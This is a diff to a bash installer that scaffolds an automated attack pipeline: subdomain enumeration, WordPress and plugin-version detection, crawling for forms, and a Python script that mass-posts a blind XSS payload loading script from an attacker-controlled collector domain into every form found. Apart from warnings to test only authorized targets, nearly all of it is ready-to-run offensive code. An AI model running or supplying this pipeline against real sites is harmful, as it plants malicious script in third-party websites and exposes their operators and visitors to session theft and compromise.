@@ -1,7 +1,8 @@
 #!/usr/bin/env bash
 # recon-pipeline-setup.sh
 # One-shot installer + pipeline scaffold for recon -> detection -> crawl -> blind-xss delivery
-# Target: 
+# Target: Ubuntu 22.04+ (tested)
+# WARNING: Use only on targets you are authorized to test (bug bounty programs / pentest scope).
 
 set -euo pipefail
 WORKDIR="$HOME/recon_pipeline"
@@ -50,3 +51,199 @@ fi
 echo "Dependencies installed."
 BASH
 
+cat > pipeline.sh <<'BASH'
+#!/usr/bin/env bash
+# pipeline.sh
+# Usage: ./pipeline.sh programs.txt
+# programs.txt should contain one program domain/asset per line (e.g. example.com)
+set -euo pipefail
+if [ "$#" -lt 1 ]; then
+  echo "Usage: $0 programs.txt"
+  exit 1
+fi
+PROGRAMS="$1"
+WORKDIR="$(pwd)"
+OUTDIR="$WORKDIR/out"
+mkdir -p "$OUTDIR"
+
+# Step A: Expand programs -> subdomains
+echo "[1/6] Running subfinder..."
+subfinder -dL "$PROGRAMS" -all -silent -o "$OUTDIR/subs.txt"
+
+# Step B: Probe alive + detect tech (httpx)
+echo "[2/6] Running httpx to find alive hosts and detect tech..."
+httpx -l "$OUTDIR/subs.txt" -silent -title -status-code -tech-detect -o "$OUTDIR/httpx_full.txt"
+# Extract hosts only
+awk '{print $1}' "$OUTDIR/httpx_full.txt" | sed 's/https\?:\/\///' | sort -u > "$OUTDIR/hosts.txt"
+
+# Step C: Filter WordPress hosts (simple heuristics: /wp-admin, x-powered-by:WordPress or html generator)
+echo "[3/6] Filtering WordPress hosts..."
+cat "$OUTDIR/hosts.txt" | httpx -silent -path "/wp-admin/" -status-code -o "$OUTDIR/wp_candidates.txt"
+# Also check generator meta tag
+python3 - <<'PY'
+import sys,requests
+hosts=open('out/hosts.txt').read().splitlines()
+wp=[]
+for h in hosts:
+    url = f'https://{h}'
+    try:
+        r = requests.get(url, timeout=8)
+        txt = r.text.lower()
+        if 'wordpress' in txt or '/wp-content/' in txt:
+            wp.append(h)
+    except Exception:
+        try:
+            r = requests.get('http://'+h, timeout=8)
+            txt = r.text.lower()
+            if 'wordpress' in txt or '/wp-content/' in txt:
+                wp.append(h)
+        except Exception:
+            pass
+open('out/wp_detected.txt','w').write('\n'.join(sorted(set(wp))))
+print('Found',len(set(wp)),'wordpress candidates')
+PY
+
+# Step D: Nuclei scan for plugin/version using template (provided in templates/)
+echo "[4/6] Running nuclei to detect plugin/version..."
+if [ ! -f templates/plugin-version.yaml ]; then
+  echo "Missing templates/plugin-version.yaml — please add your nuclei template to templates/"
+else
+  nuclei -t templates/plugin-version.yaml -l out/wp_detected.txt -o "$OUTDIR/vuln_plugin.txt" || true
+fi
+
+# Step E: Crawl discovered vulnerable hosts with katana
+echo "[5/6] Crawling vulnerable hosts with katana to collect pages..."
+mkdir -p "$OUTDIR/katana_pages"
+if [ -s "$OUTDIR/vuln_plugin.txt" ]; then
+  cut -d' ' -f1 "$OUTDIR/vuln_plugin.txt" | sort -u > "$OUTDIR/vuln_hosts.txt"
+  while read -r host; do
+    echo "Crawling https://$host"
+    katana -u "https://$host" -depth 3 -o "$OUTDIR/katana_pages/${host}.txt" || true
+  done < "$OUTDIR/vuln_hosts.txt"
+else
+  echo "No vuln hosts found by nuclei. Exiting crawl step."
+fi
+
+# Step F: Extract form endpoints and save to forms.txt
+echo "[6/6] Extracting forms from crawled pages..."
+python3 - <<'PY'
+from bs4 import BeautifulSoup
+import glob
+forms=set()
+for f in glob.glob('out/katana_pages/*.txt'):
+    try:
+        txt=open(f,'r',errors='ignore').read()
+    except:
+        continue
+    soup=BeautifulSoup(txt,'html.parser')
+    for form in soup.find_all('form'):
+        action=form.get('action', '').strip()
+        if action.startswith('http'):
+            forms.add(action)
+        elif action.startswith('/'):
+            host = f.split('/')[-1].replace('.txt','')
+            forms.add('https://'+host+action)
+    # also basic heuristics: look for contact pages
+    for line in txt.splitlines():
+        if 'contact' in line.lower() and 'http' in line.lower():
+            parts=line.split()
+            for p in parts:
+                if p.startswith('http') and 'mailto' not in p:
+                    forms.add(p)
+open('out/forms.txt','w').write('\n'.join(sorted(forms)))
+print('Forms extracted:',len(forms))
+PY
+
+echo "Pipeline finished. Outputs in $OUTDIR"
+ls -lah "$OUTDIR"
+
+echo "Next step: configure your XSS catcher (e.g., ezXSS) and set YOUR_XSS_DOMAIN in send_payloads.py."
+BASH
+
+cat > send_payloads.py <<'PY'
+#!/usr/bin/env python3
+"""
+send_payloads.py
+Reads out/forms.txt and posts a payload to the endpoints found.
+Configure YOUR_XSS_DOMAIN variable below to your collector.
+WARNING: Only test authorized targets.
+"""
+import requests
+from urllib.parse import urlparse
+from tqdm import tqdm
+
+YOUR_XSS_DOMAIN = "your-xss-domain.example"  # <-- SET THIS before running
+# A simple payload; using <script src=...> style so it triggers an external request
+payload_template = '<script src="https://{domain}/p.js?u={token}"></script>'
+
+forms_file = 'out/forms.txt'
+if __name__ == '__main__':
+    with open(forms_file) as f:
+        forms = [l.strip() for l in f if l.strip()]
+    print(f'Loaded {len(forms)} form endpoints')
+    for i, form in enumerate(forms):
+        try:
+            token = f't{str(i)}'
+            payload = payload_template.format(domain=YOUR_XSS_DOMAIN, token=token)
+            # naive POST attempt, common form fields
+            data = {'name':'recon','email':'recon@example.com','message':payload}
+            print('->',form)
+            try:
+                r = requests.post(form, data=data, timeout=12, allow_redirects=True)
+                print('  status',r.status_code)
+            except Exception as e:
+                # try GET param injection
+                try:
+                    r = requests.get(form, params={'q':payload}, timeout=12)
+                    print('  status(GET)',r.status_code)
+                except Exception as e2:
+                    print('  failed:',e2)
+        except Exception as e:
+            print('error sending to', form, e)
+PY
+
+cat > templates/plugin-version.yaml <<'YAML'
+id: wordpress-detect-plugin-version
+info:
+  name: WP plugin/version detection (example)
+  author: recon-pipeline
+  severity: info
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/yourplugin/readme.txt"
+      - "{{BaseURL}}/wp-content/plugins/yourplugin/style.css"
+      - "{{BaseURL}}/wp-content/plugins/yourplugin/changelog.txt"
+    matchers:
+      - type: word
+        words:
+          - "Stable tag:"
+          - "Version"
+        part: body
+YAML
+
+chmod +x install_deps.sh pipeline.sh send_payloads.py
+
+cat > README.md <<'MD'
+# Recon Pipeline (scaffold)
+
+Files created:
+ - install_deps.sh  : install system deps + PD tools
+ - pipeline.sh      : main pipeline. Usage: ./pipeline.sh programs.txt
+ - send_payloads.py : naive payload sender; set YOUR_XSS_DOMAIN inside
+ - templates/plugin-version.yaml : example nuclei template
+ - out/              : pipeline outputs
+
+Quick start:
+ 1. Edit templates/plugin-version.yaml to detect your specific plugin/version.
+ 2. Put your programs list in programs.txt (one program domain per line).
+ 3. Run: ./install_deps.sh
+ 4. Run: ./pipeline.sh programs.txt
+ 5. Configure your XSS catcher (ezXSS or xsshunter) and set YOUR_XSS_DOMAIN in send_payloads.py
+ 6. Run: python3 send_payloads.py
+
+LEGAL: Only test targets you are authorized to test (bug bounty program in-scope assets / pentest scope).
+MD
+
+echo "Scaffold created. Run ./install_deps.sh then ./pipeline.sh programs.txt"
